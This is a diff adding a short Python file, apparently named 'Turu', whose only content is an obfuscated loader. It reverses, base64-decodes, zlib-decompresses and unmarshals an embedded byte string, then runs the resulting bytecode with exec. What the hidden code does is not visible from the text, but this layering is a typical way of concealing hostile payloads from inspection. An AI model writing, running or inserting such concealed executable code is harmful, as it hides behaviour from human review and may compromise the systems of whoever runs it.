@@ -1,0 +1,2 @@
+# Turu
+_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'oKmej9UT1JPNm7OpkK2Yeatz2Kh9vQVbFu973kg+9duEYuZ4AqkuB4kxJyFYx/SWKfsiIwuHEfZPIb5exN7nVfVlxLyrCY2ZHcdukTEPbQxNu7f1ytfX0w7tga5zt6eIOKxDdcr7QkRULRt9mYB6dTge0dtaYWAo1XWxTTZvGyqbnHbP3ovKzrR7BKRDa8OjAt02rNteLZqtz78jOT69i+ZmWwb1DetCSYeQ4LXAfCWqQAKyLIsaK+i4uMHISwY8KaKSnno5qYEUjn6DBUFJN0lwKJIITGh9YcNGE9u8bl/4/Mv5mZbFN4Y1C07gyVZyC1RzL1kgzK7JsJCCxjgr0IkQvEVIaBrTaUlEgwlEuccn80uhQADxOtTjdxJe'))
